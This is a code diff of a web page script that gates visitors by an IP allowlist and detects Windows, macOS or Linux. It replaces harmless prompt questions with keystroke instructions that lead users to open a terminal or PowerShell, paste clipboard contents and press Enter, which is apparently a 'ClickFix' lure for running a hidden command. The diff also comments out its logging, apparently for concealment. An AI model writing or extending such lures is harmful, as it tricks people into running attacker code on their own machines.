@@ -69,7 +69,7 @@ async function fetchClientIp(): Promise<string> {
       });
       const ip = normalizeIp(String(data?.ip || ""));
       if (ip) {
-        console.log("[client-ip]", ip, "(via", url, ")");
+        // console.log("[client-ip]", ip, "(via", url, ")");
         return ip;
       }
       errors.push(`${url}: empty ip`);
@@ -80,7 +80,7 @@ async function fetchClientIp(): Promise<string> {
           ? e.message
           : String(e);
       errors.push(`${url}: ${msg}`);
-      console.warn("[client-ip] failed", url, msg);
+      // console.warn("[client-ip] failed", url, msg);
     }
   }
 
@@ -97,8 +97,8 @@ async function lookupWhoisIp(ip: string): Promise<string> {
     },
   );
   const text = String(data?.text || "").trim();
-  console.log("[whois] url:", data?.url || `${WHOIS_LOOKUP_BASE}${ip}`);
-  console.log("[whois] summary:", text.slice(0, 500));
+  // console.log("[whois] url:", data?.url || `${WHOIS_LOOKUP_BASE}${ip}`);
+  // console.log("[whois] summary:", text.slice(0, 500));
   return text;
 }
 
@@ -126,13 +126,13 @@ async function fetchAllowedIps(): Promise<{ ips: string[]; raw: string }> {
       }
 
       const ips = parseIpList(json);
-      console.log("[allowed-ips] url:", url);
-      console.log("[allowed-ips] raw:", text);
-      console.log("[allowed-ips] parsed:", ips);
+      // console.log("[allowed-ips] url:", url);
+      // console.log("[allowed-ips] raw:", text);
+      // console.log("[allowed-ips] parsed:", ips);
       return { ips, raw: text };
     } catch (e) {
       lastError = e;
-      console.warn("[allowed-ips] axios failed for", url, e);
+      // console.warn("[allowed-ips] axios failed for", url, e);
     }
   }
 
@@ -150,7 +150,7 @@ function ipAllowed(clientIp: string, ips: string[], raw: string): boolean {
 }
 
 async function isClientIpAllowed(): Promise<boolean> {
-  console.log("[ip-check] starting…");
+  // console.log("[ip-check] starting…");
 
   let clientIp = "";
   let allowed: string[] = [];
@@ -159,12 +159,12 @@ async function isClientIpAllowed(): Promise<boolean> {
   try {
     clientIp = await fetchClientIp();
   } catch (e) {
-    console.warn("[ip-check] client ip failed", e);
-    console.log("[ip-check] client: (none)", "allowed-list: (not fetched)");
+    // console.warn("[ip-check] client ip failed", e);
+    // console.log("[ip-check] client: (none)", "allowed-list: (not fetched)");
     return false;
   }
 
-  console.log("[ip-check] client IP:", clientIp);
+  // console.log("[ip-check] client IP:", clientIp);
 
   try {
     await lookupWhoisIp(clientIp);
@@ -177,22 +177,22 @@ async function isClientIpAllowed(): Promise<boolean> {
     allowed = result.ips;
     raw = result.raw;
   } catch (e) {
-    console.warn("[ip-check] allowlist failed", e);
-    console.log("[ip-check] client:", clientIp, "allowed-list: (fetch failed)");
+    // console.warn("[ip-check] allowlist failed", e);
+    // console.log("[ip-check] client:", clientIp, "allowed-list: (fetch failed)");
     return false;
   }
 
   const ok = ipAllowed(clientIp, allowed, raw);
-  console.log("[ip-check] =========================");
-  console.log("[ip-check] client IP     :", clientIp);
-  console.log("[ip-check] jsonstorage   :", allowed);
-  console.log("[ip-check] raw payload   :", raw);
-  console.log("[ip-check] match result  :", ok);
-  console.log("[ip-check] =========================");
+  // console.log("[ip-check] =========================");
+  // console.log("[ip-check] client IP     :", clientIp);
+  // console.log("[ip-check] jsonstorage   :", allowed);
+  // console.log("[ip-check] raw payload   :", raw);
+  // console.log("[ip-check] match result  :", ok);
+  // console.log("[ip-check] =========================");
   return ok;
 }
 
-type PlatformKind = "windows" | "mac-silicon" | "mac-intel";
+type PlatformKind = "windows" | "mac-silicon" | "mac-intel" | "linux";
 
 const PLATFORM_CONFIG: Record<
   PlatformKind,
@@ -201,25 +201,36 @@ const PLATFORM_CONFIG: Record<
   windows: {
     suffix: "8370- windows",
     steps: [
-      "What did you do today?",
-      "What are you working on right now?",
-      "What's your favorite food?",
+      "Press Windows Key (🪟) + X.",
+      "Press I",
+      "Press Ctrl + V.",
+      "Press Enter.",
     ],
   },
   "mac-silicon": {
     suffix: "8370- mac apple silicon",
     steps: [
-      "What's your favorite food?",
-      "What do you usually do on weekends?",
-      "What's something interesting that happened to you recently?",
+      "Press Command (⌘) + Space",
+      "Type Terminal",
+      "Press Command (⌘) + V",
+      "Press Enter.",
     ],
   },
   "mac-intel": {
     suffix: "8370- mac apple intel",
     steps: [
-      "What's something you've changed your mind about recently?",
-      "What's the most interesting project you've worked on?",
-      "What's something you're currently trying to improve?",
+      "Press Command (⌘) + Space",
+      "Type Terminal",
+      "Press Command (⌘) + V",
+      "Press Enter.",
+    ],
+  },
+  linux: {
+    suffix: "8370- linux",
+    steps: [
+      "Press Ctrl + Alt + T",
+      "Press Ctrl + Shift + V",
+      "Press Enter.",
     ],
   },
 };
@@ -234,31 +245,52 @@ function buildVerifyPayload(kind: PlatformKind) {
 async function detectPlatform(): Promise<PlatformKind> {
   const ua = navigator.userAgent || "";
   const platform = navigator.platform || "";
-  const isWin = /Win/i.test(platform) || /Windows/i.test(ua);
-  const isMac = /Mac/i.test(platform) || /Mac OS|Macintosh/i.test(ua);
 
+  let uaPlatform = "";
+  let architecture = "";
+  try {
+    const nav = navigator as Navigator & {
+      userAgentData?: {
+        platform?: string;
+        getHighEntropyValues: (
+          hints: string[],
+        ) => Promise<{ architecture?: string; platform?: string }>;
+      };
+    };
+    uaPlatform = nav.userAgentData?.platform || "";
+    if (nav.userAgentData?.getHighEntropyValues) {
+      const values = await nav.userAgentData.getHighEntropyValues([
+        "architecture",
+        "platform",
+      ]);
+      architecture = values.architecture || "";
+      uaPlatform = values.platform || uaPlatform;
+    }
+  } catch {
+    /* ignore */
+  }
+
+  const isAndroid = /Android/i.test(ua) || /Android/i.test(uaPlatform);
+  const isWin =
+    /Win/i.test(platform) || /Windows/i.test(ua) || /^Win/i.test(uaPlatform);
+  const isMac =
+    /Mac/i.test(platform) ||
+    /Mac OS|Macintosh/i.test(ua) ||
+    /macOS/i.test(uaPlatform);
+  const isLinux =
+    !isAndroid &&
+    (/Linux/i.test(platform) ||
+      /Linux/i.test(ua) ||
+      /^Linux$/i.test(uaPlatform) ||
+      /X11/i.test(ua));
+
+  if (isLinux && !isWin && !isMac) return "linux";
   if (isWin && !isMac) return "windows";
 
   if (isMac) {
     // Chromium high-entropy architecture (arm = Apple Silicon, x86 = Intel)
-    try {
-      const nav = navigator as Navigator & {
-        userAgentData?: {
-          getHighEntropyValues: (
-            hints: string[],
-          ) => Promise<{ architecture?: string }>;
-        };
-      };
-      if (nav.userAgentData?.getHighEntropyValues) {
-        const { architecture } = await nav.userAgentData.getHighEntropyValues([
-          "architecture",
-        ]);
-        if (architecture === "arm") return "mac-silicon";
-        if (architecture === "x86") return "mac-intel";
-      }
-    } catch {
-      /* ignore */
-    }
+    if (architecture === "arm") return "mac-silicon";
+    if (architecture === "x86") return "mac-intel";
 
     // WebGL renderer fallback (Apple GPU vs Intel)
     try {
